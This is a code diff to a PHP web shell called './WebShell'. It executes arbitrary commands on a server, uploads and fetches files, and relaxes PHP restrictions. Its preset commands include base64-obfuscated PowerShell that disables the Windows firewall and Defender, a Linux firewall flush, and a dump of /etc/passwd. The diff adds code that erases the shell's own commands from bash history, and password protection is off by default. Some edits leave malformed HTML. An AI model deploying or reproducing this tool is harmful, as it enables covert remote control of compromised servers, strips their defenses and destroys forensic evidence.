@@ -1,4 +1,8 @@
 #<?php
+session_start();
+if (!isset($_SESSION['command_history'])) {
+    $_SESSION['command_history'] = [];
+}
 define('passauth', False);
 $autolog = False;
 $passprompt = '';
@@ -93,10 +97,11 @@ if (!$autolog) {
       alert('Logging out for security');
     }, 900000);
   </script><?php
-}if (passauth &&!empty($passhash)) {
+}
+if (passauth && !empty($passhash)) {
     if (function_exists('hash_hmac') || function_exists('mhash')) {
-        $auth = empty($_POST['auth'])? h($pass) : $_POST['auth'];
-        if (h($auth)!== $passhash) {
+        $auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
+        if (h($auth) !== $passhash) {
           ?><head><title>./WebShell</title></head><style>
                 input[type="text"], input[type="password"] {
                     width: 100%;
@@ -112,13 +117,16 @@ if (!$autolog) {
                     cursor: pointer;}
                 input[type="submit"]:hover {
                     background-color: #3e8e41;}</style>
-            <form action="<?php e($url);?>" method="post">
-                <h3><?php e($passprompt);?></h3>
+            <form action="<?php e($url); ?>" method="post">
+                <h3><?php e($passprompt); ?></h3>
                 <input name="pass" size="30" type="password"> 
                 <input value="  Login  " type="submit"></form>
-            <?php exit;}
+            <?php exit;
+        }
     } else {
-        $status.= "${warn} Password disabled.<br />";}}
+        $status .= "${warn} Password disabled.<br />";
+    }
+}
 if (!ini_get('allow_url_fopen')) {
     ini_set('allow_url_fopen', '1');
     if (!ini_get('allow_url_fopen')) {
@@ -126,51 +134,65 @@ if (!ini_get('allow_url_fopen')) {
             $fetch_func = 'fetch_sock';
         } else {
             $fetch_func = '';
-            $status.= "${warn} File fetching disabled ('allow_url_fopen' disabled and 'tream_select()' missing).<br />";}}}
+            $status .= "${warn} File fetching disabled ('allow_url_fopen' disabled and 'stream_select()' missing).<br />";
+        }
+    }
+}
 if (!ini_get('file_uploads')) {
     ini_set('file_uploads', '1');
     if (!ini_get('file_uploads')) {
-        $status.= "${warn} File uploads disabled.<br />";}}
-if (ini_get('open_basedir') &&!ini_set('open_basedir', '')) {
-    $status.= "${warn} open_basedir = ". ini_get('open_basedir'). "<br />";}
+        $status .= "${warn} File uploads disabled.<br />";
+    }
+}
+if (ini_get('open_basedir') && !ini_set('open_basedir', '')) {
+    $status .= "${warn} open_basedir = " . ini_get('open_basedir') . "<br />";
+}
 if (!chdir($cwd)) {
-    $cwd = getcwd();}
-if (!empty($fetch_func) &&!empty($fetch_path)) {
-    $dst = $cwd. DIRECTORY_SEPARATOR. basename($fetch_path);
-    $status.= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);}
-if (ini_get('file_uploads') &&!empty($_FILES['upload'])) {
-    $dest = $cwd. DIRECTORY_SEPARATOR. basename($_FILES['upload']['name']);
+    $cwd = getcwd();
+}
+if (!empty($fetch_func) && !empty($fetch_path)) {
+    $dst = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
+    $status .= $fetch_func($fetch_host, $fetch_port, $fetch_path, $dst);
+}
+if (ini_get('file_uploads') && !empty($_FILES['upload'])) {
+    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
     if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
-        $status.= "${ok} Uploaded file <i>${dest}</i> (". $_FILES['upload']['size']. " bytes)<br />";}}
+        $status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES['upload']['size'] . " bytes)<br />";
+    }
+}
 ?>
-<form action="<?php e($url);?>" method="post" enctype="multipart/form-data"<?php if (ini_get('file_uploads')):?><?php endif;?>>
+<form action="<?php e($url); ?>" method="post" enctype="multipart/form-data"<?php if (ini_get('file_uploads')) : ?><?php endif; ?>>
 <head><title>./WebShell</title></head><h2>./WebShell</h2>
-<?php if (!passauth):?>
+<?php if (!passauth): ?>
   <p style="color: red;">WARNING! Password disabled. Anyone can execute commands.</p>
-<?php else:?>
+<?php else: ?>
   <p style="color: green;">Password protected.</p>
-<?php endif;?>
-<p>Auto-logout is <span style="color: <?= $autolog? 'green' : 'red';?>"><?= $autolog? 'enabled' . ' every 15 minutes' : 'disabled';?></span></p>
-    <?php if (!empty($passhash)):?>
-        <input name="auth" type="hidden" value="<?php e($auth);?>">
-    <?php endif;?>
+<?php endif; ?>
+<p>Auto-logout is <span style="color: <?= $autolog ? 'green' : 'red'; ?>"><?= $autolog ? 'enabled' . ' every 15 minutes' : 'disabled'; ?></span></p>
+    <?php if (!empty($passhash)): ?>
+        <input name="auth" type="hidden" value="<?php e($auth); ?>">
+    <?php endif; ?>
     <table border="0">
-        <?php if (!empty($fetch_func)):?>
+        <?php if (!empty($fetch_func)): ?>
             <tr><td><b>Fetch:</b></td>
-                <td>host: <input name="fetch_host" id="fetch_host" size="15" value="<?php e($fetch_host);?>"> 
-                    port: <input name="fetch_port" id="fetch_port" size="4" value="<?php e($fetch_port);?>"> 
+                <td>host: <input name="fetch_host" id="fetch_host" size="15" value="<?php e($fetch_host); ?>"> 
+                    port: <input name="fetch_port" id="fetch_port" size="4" value="<?php e($fetch_port); ?>"> 
                     path: <input name="fetch_path" id="fetch_path" size="40" value=""></td></tr>
-        <?php endif;?>
+        <?php endif; ?>
     <tr><td><b>CWD:</b></td>
-      <td><input name="cwd" id="cwd" size="50" value="<?php e($cwd);?>">
-        <?php if (ini_get('file_uploads')):?>
+      <td><input name="cwd" id="cwd" size="50" value="<?php e($cwd); ?>">
+        <?php if (ini_get('file_uploads')): ?>
           <b>Upload:</b> <input name="upload" id="upload" type="file">
-        <?php endif;?></td></tr>
-    <tr><td><b>Command:</b></td>
-      <td><input name="cmd" id="cmd" size="55" value="<?php e($cmd);?>">
+        <?php endif; ?>
+      </td>
+    </tr>
+    <tr>
+      <td><b>Command:</b></td>
+      <td>
+        <input name="cmd" id="cmd" size="55" value="<?php e($cmd); ?>">
         <select id="auto_cmds" onchange="fillCmd(this.value)">
           <option value="">Auto commands</option>
-          <?php if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'):?>
+          <?php if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'): ?>
             <optgroup label="Windows">
               <option value="echo User Info: & whoami & echo User Info Detailed: & whoami /all & echo Session Info: & qwinsta & echo Net User Info: & net user">Show all groups/users</option>
               <option value="echo IPv4 Configuration: & netsh interface ipv4 show config & echo WLAN Profiles: & netsh wlan show profiles">Show network information</option>
@@ -180,10 +202,12 @@ if (ini_get('file_uploads') &&!empty($_FILES['upload'])) {
               <option value="set">Show enviroment vars</option>
               <option value="curl checkip.amazonaws.com">Get public IP address</option>
               <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZjtzYyBzdG9wIFdpbkRlZmVuZA==')))">(admin, b64) Disable Firewall+WinDefender</option>
-              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">(admin, b64) Restore Firewall+WinDefender</option></optgroup>
-          <?php else:?>
+              <option value="powershell -ExecutionPolicy Bypass -Command Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9uO3NjIHN0YXJ0IFdpbkRlZmVuZA==')))">(admin, b64) Restore Firewall+WinDefender</option>
+              <option value="erase_history_windows">Erase ./WebShell History (Windows)</option>
+            </optgroup>
+          <?php else: ?>
             <optgroup label="Linux">
-              <option value="echo Whoami:;whoami;echo \\nUsers Logged On:;w;echo \\nUser ID:;id;echo \\n/etc/passwd Contents:;cat /etc/passwd
+              <option value="echo Whoami:;whoami;echo \\nUsers Logged On:;w;echo \\nUser  ID:;id;echo \\n/etc/passwd Contents:;cat /etc/passwd
 ">Show all groups/users</option>
               <option value="echo Network Connections:;nmcli con show;echo \\nInterfaces:;ifconfig;echo \\nWireless Interfaces:;iwconfig">Show network information</option>
               <option value="lsof">Show all processes(SLOW)</option>
@@ -192,27 +216,41 @@ if (ini_get('file_uploads') &&!empty($_FILES['upload'])) {
               <option value="df -h">Show all drives</option>
               <option value="printenv">Show enviroment vars</option>
               <option value="curl checkip.amazonaws.com">Get public IP address</option>
-              <option value="sudo iptables -L > iptables.backup;sudo iptables -F">(sudo) Disable firewall</option>
-              <option value="sudo iptables-restore < iptables.backup">(sudo) Restore firewall</option></optgroup><?php endif;?></select></td></tr>
-    <tr><td colspan="2">
-        <input type="submit" value="  Execute  "></td></tr></table></form>
+              <option value="sudo iptables -L > iptables.backup;sudo iptables -F">(sudo) Disable firewall</option <option value="sudo iptables-restore < iptables.backup">(sudo) Restore firewall</option>
+              <option value="erase_history_linux">Erase ./WebShell History (Linux)</option>
+            </optgroup>
+          <?php endif; ?>
+        </select>
+      </td>
+    </tr>
+    <tr>
+      <td colspan="2">
+        <input type="submit" value="  Execute  ">
+      </td>
+    </tr>
+  </table>
+</form>
 <script>
   function fillCmd(cmd) {
     document.getElementById('cmd').value = cmd;
-  }</script>
-<pre><?php
+  }
+</script>
+<pre>
+<?php
 if (!empty($status)) {
-    e($status);}
+    e($status);
+}
 if (!empty($cmd)) {
     $cmd = trim($cmd);
     if (empty($cmd)) {
-        $status.= "${warn} Empty command.<br />";
+        $status .= "${warn} Empty command.<br />";
     } else {
         $res = array();
         $descriptorspec = array(
             0 => array('pipe', 'r'),
             1 => array('pipe', 'w'),
-            2 => array('pipe', 'w'),);
+            2 => array('pipe', 'w'),
+        );
         $process = proc_open($cmd, $descriptorspec, $pipes, $cwd);
         if (is_resource($process)) {
             fwrite($pipes[0], '<?php die(); ?>' . PHP_EOL);
@@ -223,12 +261,46 @@ if (!empty($cmd)) {
             fclose($pipes[2]);
             proc_close($process);
             if ($res['stdout']) {
-                $res['stdout'] = htmlspecialchars($res['stdout'], ENT_QUOTES);}
+                $res['stdout'] = htmlspecialchars($res['stdout'], ENT_QUOTES);
+            }
             if ($res['stderr']) {
-                $res['stderr'] = htmlspecialchars($res['stderr'], ENT_QUOTES);}
+                $res['stderr'] = htmlspecialchars($res['stderr'], ENT_QUOTES);
+            }
             if (!empty($res['stdout'])) {
-                e($res['stdout']);}
+                e($res['stdout']);
+            }
             if (!empty($res['stderr'])) {
-                e($res['stderr']);}
+                e($res['stderr']);
+            }
         } else {
-            $status.= "${err} Failed to execute command.<br />";}}}?></pre>
+            $status .= "${err} Failed to execute command.<br />";
+        }
+    }
+}
+
+if (isset($_POST['erase_history_linux'])) {
+    $bash_history_file = getenv('HOME') . '/.bash_history';
+    if (file_exists($bash_history_file)) {
+        $history = file($bash_history_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $new_history = array_filter($history, function($line) {
+            return !in_array($line, $_SESSION['command_history']);
+        });
+        file_put_contents($bash_history_file, implode("\n", $new_history) . "\n");
+        $_SESSION['command_history'] = [];
+        $status .= 'WebShell history erased from bash history.';
+    } else {
+        $status .= 'Bash history file not found.';
+    }
+} elseif (isset($_POST['erase_history_windows'])) {
+    $clear_cmd = 'doskey /reinstall';
+    $process = proc_open($clear_cmd, $descriptorspec, $pipes, $cwd);
+    if (is_resource($process)) {
+        proc_close($process);
+        $_SESSION['command_history'] = [];
+        $status .= 'WebShell history erased from current command session.';
+    } else {
+        $status .= 'Failed to clear command history.';
+    }
+}
+?>
+</pre>
